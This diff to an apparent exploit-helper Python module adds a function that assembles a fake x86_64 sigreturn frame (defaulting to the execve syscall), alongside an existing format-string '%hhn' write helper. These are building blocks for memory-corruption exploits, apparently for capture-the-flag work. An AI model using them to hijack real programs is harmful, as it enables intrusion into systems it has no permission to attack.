@@ -54,3 +54,44 @@ def fmtchar(prev_word,word,index,byte = 1):
     else :
         fmt += "%" + str(index) + "$hhn"
     return fmt
+
+#srop x86_64
+def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0):
+    uc_flags,uc_link,ss_sp,ss_flags,ss_size = [0,0,0,0,0]
+    r8,r9,r10,r11,r12,r13,r14,r15 = [0,0,0,0,0,0,0,0]
+    eflags = 0x246
+    cs,fs,gs,pad = [0x33,0,0,0]
+    selector = cs + (fs << 8*2) + (gs << 8*4) + (pad << 8*6)
+    [err,trapno,oldmask,cr2,fpstate] = [0,0,0,0,0]
+    ucontext = ""
+    ucontext += pack(sigret)
+    ucontext += pack(uc_flags)
+    ucontext += pack(uc_link)
+    ucontext += pack(ss_sp)
+    ucontext += pack(ss_flags)   
+    ucontext += pack(ss_size)    
+    ucontext += pack(r8)    
+    ucontext += pack(r9)    
+    ucontext += pack(r10)    
+    ucontext += pack(r11)    
+    ucontext += pack(r12)    
+    ucontext += pack(r13)    
+    ucontext += pack(r14)    
+    ucontext += pack(r15)    
+    ucontext += pack(rdi)    
+    ucontext += pack(rsi)    
+    ucontext += pack(rbp)    
+    ucontext += pack(rbx)    
+    ucontext += pack(rdx)    
+    ucontext += pack(rax)    
+    ucontext += pack(rcx)    
+    ucontext += pack(rsp)    
+    ucontext += pack(rip)
+    ucontext += pack(eflags)
+    ucontext += pack(selector)
+    ucontext += pack(err)
+    ucontext += pack(trapno)
+    ucontext += pack(oldmask)
+    ucontext += pack(cr2)
+    return ucontext
+    
